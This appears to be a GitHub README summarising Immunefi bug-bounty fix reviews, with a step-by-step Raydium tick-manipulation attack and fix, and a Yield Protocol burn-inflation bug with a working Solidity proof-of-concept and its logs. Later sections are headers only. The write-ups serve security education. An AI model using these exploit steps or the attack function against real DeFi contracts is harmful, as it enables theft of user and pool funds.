# Immunefi Bug Fixes

This repository documents research on critical bug fixes identified on Immunefi in 2023-2024, highlighting how these vulnerabilities were exploited, their impact on projects, and the subsequent fixes implemented. The goal is to provide insights into common pitfalls, remediation strategies, and lessons learned from real-world bug bounty reports.

# 1. Raydium - Tick Manipulation

Reported by: @riproprip

Protocol: Raydium

Date: January 10, 2024

Bounty: $505,000 in RAY tokens

### TL;DR

The vulnerability in Raydium's `increase_liquidity` function allowed attackers to manipulate liquidity at arbitrary price points by exploiting the `tickarray_bitmap_extension`. The function failed to verify if the account used for this extension was correct, letting attackers misuse it to "flip" tick statuses and perform unauthorized liquidity operations. This manipulation could significantly impact the pool's integrity and lead to financial loss. The fix involved adding a validation step to ensure the correct `TickArrayBitmapExtension` account is used, preventing these unauthorized actions.

### Vulnerability Analysis

Raydium is an AMM with an integrated central order book system. Users can provide liquidity, perform swaps on the exchange, and stake the RAY token for additional yield. A fundamental aspect of Raydium is the Concentrated Liquidity Market Maker (CLMM).

The vulnerability was located within the [increase_liquidity](Raydium/increase_liquidity.rs) file of the Raydium protocol. It conducts several critical operations, including pool status validation, token amount calculations based on user-provided maximums, fee updates, and the actual increase of liquidity in the position’s state.

Ticks represent discrete price points in a CLMM. By defining a range with tick_lower and tick_upper, an LP specifies the boundaries within which their liquidity will be active.

The flaw was specifically in the conditional handling of the [tickarray_bitmap_extension](https://github.com/tpiliposian/Immunefi_bugfixes/blob/bde6c3486e58d91fff972cbdb12b8c4d56f2327f/Raydium/increase_liquidity.rs#L291):

```rust
let use_tickarray_bitmap_extension = pool_state.is_overflow_default_tickarray_bitmap(vec![tick_lower, tick_upper]);

[...]

if use_tickarray_bitmap_extension {
    Some(&remaining_accounts[0])
} else {
    None
}
```

The `tickarray_bitmap_extension` is crucial in managing the pool’s pricing at extreme boundaries (very high or low prices). It also acts as an extended index to manage a larger range of price ticks which helps track which ticks have been initialized (i.e., have non-zero liquidity) beyond the default capacity of the system. The conditional logic decides whether an account from `remaining_accounts` is needed for the operation. This account is presumably related to handling the tick array bitmap extension. This function is designed to increase liquidity in a specific position within a liquidity pool using the remaining_accounts vector.

`remaining_accounts` is a vector containing all accounts passed into the instruction but not declared in the Accounts struct. This is useful when you want your function to handle a variable amount of accounts, e.g. when initializing a game with a variable number of players.

The vulnerability arises because the function fails to verify whether `remaining_accounts[0]` is the accurate `TickArrayBitmapExtension` account linked to the current state of the pool. This oversight permits an attacker to execute liquidity operations at arbitrary price boundaries as described in the vulnerability demonstration section below.

### Steps of the Attack:

- Create a Secondary Pool: The attacker sets up a secondary pool.
- Target a Tick: They open a position at a specific tick they want to exploit in the primary pool.
- Zero Out and Manipulate Liquidity: They reduce the liquidity at this tick to zero and then increase it in a way that incorrectly uses the tickarray_bitmap of the primary pool.

This manipulation lets the attacker “flip” a tick’s status in the bitmap. Transactions that should have adjusted liquidity at certain prices bypass these checks, allowing unauthorized liquidity increases.

To clarify the exploit process using a practical example, consider price points A, B, and C, with A < B < C and both A and B within the lower range of the `bitmap_array`.
The steps to exploit the vulnerability are as follows:
1. Identify a victim pool.
2. Execute a swap to shift the price to just above point A (A+1).
3. Create liquidity within the price range B to C.
4. Perform a swap across B without crossing C, which adds liquidity to the pool state due to the manipulated `tickarray_bitmap`.
5. Execute the described attack to switch the `tickarray_bitmap` status at B to DISABLED, allowing a swap at A+1 to skip over B without affecting liquidity.
6. Repeat the attack to re-enable the `tickarray_bitmap` at B.
7. Perform another swap over B without crossing C, effectively doubling the liquidity erroneously.
8. This process can be repeated as many times as desired to amass an excessive amount of liquidity.
9. Following this procedure, swaps directed towards C will yield disproportionately high amounts of Token A, indicating the vulnerability has been fully exploited.
10. If the goal is to acquire Token B, the process can be replicated at the higher end of the price spectrum.
The core issue is the ability to “flip” a tick’s status within the tickarray_bitmap, allowing liquidity to be added without proper checks. This leads to significant discrepancies in liquidity management and compromises the integrity of the liquidity pool.

### Vulnerability Fix

The correction involved adding a security check to ensure the correct application of the `tickarray_bitmap_extension`:

```rust
if use_tickarray_bitmap_extension {
    require_keys_eq!(
        remaining_accounts[0].key(),
        TickArrayBitmapExtension::key(pool_state_loader.key())
    );
    Some(&remaining_accounts[0])
} else {
    None
}
```

This [fix](https://github.com/raydium-io/raydium-clmm/commit/83b5a471f2323fcac3848addab725b95e09ddeb8?source=post_page-----c6aae4527ed6--------------------------------) introduces a validation step to confirm that the `remaining_accounts[0]` is the correct `TickArrayBitmapExtension` account associated with the pool’s current state.
This ensures the proper handling of liquidity operations involving extreme price boundaries, thereby preventing the exploitation of this vulnerability in the future.

# 2. Yield Protocol - Logic Error

Reported by: @Paludo0x

Protocol: Yield

Date: April 28th, 2023

Bounty: $95,000 USDC

### TL;DR



### Vulnerability Analysis

Yield Protocol is a DeFi protocol that enables fixed-rate, fixed-term loan options between borrowers and lenders.

The protocol facilitates these transactions via `fyTokens` (fixed yield tokens), a type of `ERC-20` token that can be exchanged one-to-one for an underlying asset upon reaching a predetermined maturity date.

The vulnerability is associated with the [strategy contract](https://arbiscan.io/address/0x5aeB4EFaAA0d27bd606D618BD74Fe883062eAfd0#code) of the protocol, which enables liquidity providers to deposit combined liquidity to a `YieldSpace` Pool.

By depositing funds into the strategy contract, liquidity providers can mint strategy tokens. The amount of strategy tokens they receive corresponds proportionately to their deposit amount, allowing them to burn and redeem the LP tokens as well as any gain in fees/interest later.

This vulnerability is associated with the burning shares functionality `burn(address to)` of the strategy contract which is responsible for burning the strategy tokens and allowing the user to withdraw the LP tokens:

```solidity
    function burn(address to)
        external
        isState(State.INVESTED)
        returns (uint256 poolTokensObtained)
    {
        // Caching
        IPool pool_ = pool;
        uint256 poolCached_ = poolCached;
        uint256 totalSupply_ = _totalSupply;

        // Burn strategy tokens
        uint256 burnt = _balanceOf[address(this)];
        _burn(address(this), burnt);

        poolTokensObtained = pool.balanceOf(address(this)) * burnt / totalSupply_;
        pool_.safeTransfer(address(to), poolTokensObtained);

        // Update pool cache
        poolCached = poolCached_ - poolTokensObtained;
    }
```

Initially, the contract’s strategy tokens are burned. Then, the amount of liquidity pool tokens to be acquired are calculated based on the LP tokens contained in the strategy contract and are transferred to the designated address.

The pool tokens to be returned to the caller are calculated by:

```solidity
poolTokensObtained = pool.balanceOf(address(this)) * burnt / totalSupply_;
```

This calculation is based on the LP tokens balance of the current strategy contract which could be inflated by sending the pool tokens directly to it.

The attacker has control over `pool.balanceOf(address(this))`, which allows them to inflate the pool tokens returned, by transferring a specific amount of pool tokens directly to the strategy contract before burning the strategy shares tokens.

As the pool tokens remain within the Strategy contract, the attacker making the call can mint the share tokens and then burn them back to retrieve the pool tokens that were utilized to inflate the calculation.

### PoC:

- Clone the Immunefi bugfix review repository: `git clone https://github.com/immunefi-team/bugfix-reviews-pocs.git`
- Run `forge test -vvv --match-path ./test/YieldProtocol/AttackTest.t.sol`

Attack function:

```solidity
    function _executeAttack() internal {
        console.log("\n>>> Execute attack\n");

        //burning of strategy tokens
        uint256 tokensBurnt = strategyYSDAI6MMS.burn(ada);

        //burning remaing part of LP tokens sent to strategy
        strategyYSDAI6MMS.mint(address(strategyYSDAI6MMS));
        strategyYSDAI6MMS.burn(ada);

        //retrieving and converting all tokens to base token
        FYDAI2309LPArbitrum.transfer(address(FYDAI2309LPArbitrum), FYDAI2309LPArbitrum.balanceOf(ada));
        FYDAI2309LPArbitrum.burnForBase(ada,0,type(uint128).max); // get fyToken to the ADA
        FYDAI2309LPArbitrum.retrieveBase(ada); // get DAI stored on the contract to the ADA
        FYDAI2309LPArbitrum.retrieveFYToken(ada);  // get fyToken stoeed on the contract to the ADA.

        console.log("Tokens Burnt : ",tokensBurnt);

        _completeAttack();
    
    }
```

Log output:

```
Ran 1 test for test/YieldProtocol/AttackTest.t.sol:AttackTest
[PASS] testAttack() (gas: 677227)
Logs:
  
>>> Initiate attack

  Tokens Obtained :  20916988492243432153263
  
>>> Execute attack

  Tokens Burnt :  32081082781615545896437
  
>>> Attack complete

  holder gain in base wei :  11096784340278200659569
  pool gain in base wei :  -11096784340278200659569
  Strategy gain in base wei :  0
  holder gain in FYToken :  0
  pool gain in FYToken :  0
  Strategy gain in FYToken :  0
  holder gain in LPToken :  0
  pool gain in LPToken :  0
  Strategy gain in LPToken :  -11164094289372113743173
  Pool base token amount before transactions: 1.3330628639753853259506e22
  Pool base token amount after transactions: 2.233844299475652599937e21
  holder base token amount before transactions: 1e24
  holder base token amount after transactions: 1.011096784340278200659569e24

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.61s (6.15s CPU time)
```

# 3. Silo Finance - Logic Error

Reported by: @kankodu

Protocol: Silo Finance

Date: April 28th, 2023

Bounty: $100,000 USDC

# 4. DFX Finance - Rounding Error

Reported by: @perseverance

Protocol: DFX Finance

Date: April 28, 2023

Bounty: $100,000 USDT

# 5. Enzyme Finance - Missing Privilege Check

Reported by: @rootrescue

Protocol: Enzyme Finance

Date: Mar 28, 2023

Bounty: $400,000

# 6. Moonbeam, Astar, And Acala - Library Truncation

Reported by: @pwning.eth

Protocol: Moonbeam

Date: June 27th, 2023

Bounty: $1,000,000

## References

[1]. https://medium.com/immunefi/raydium-tick-manipulation-bugfix-review-c6aae4527ed6

[2]. https://medium.com/immunefi/yield-protocol-logic-error-bugfix-review-7b86741e6f50

[3]. https://medium.com/immunefi/silo-finance-logic-error-bugfix-review-35de29bd934a

[4]. https://medium.com/immunefi/dfx-finance-rounding-error-bugfix-review-17ba5ffb4114

[5]. https://medium.com/immunefi/enzyme-finance-missing-privilege-check-bugfix-review-ddb5e87b8058

[6]. https://medium.com/immunefi/moonbeam-astar-and-acala-library-truncation-bugfix-review-1m-payout-41a862877a5b

## Contact

For questions or suggestions, please contact [me](https://x.com/tpiliposian).

Tigran Piliposyan
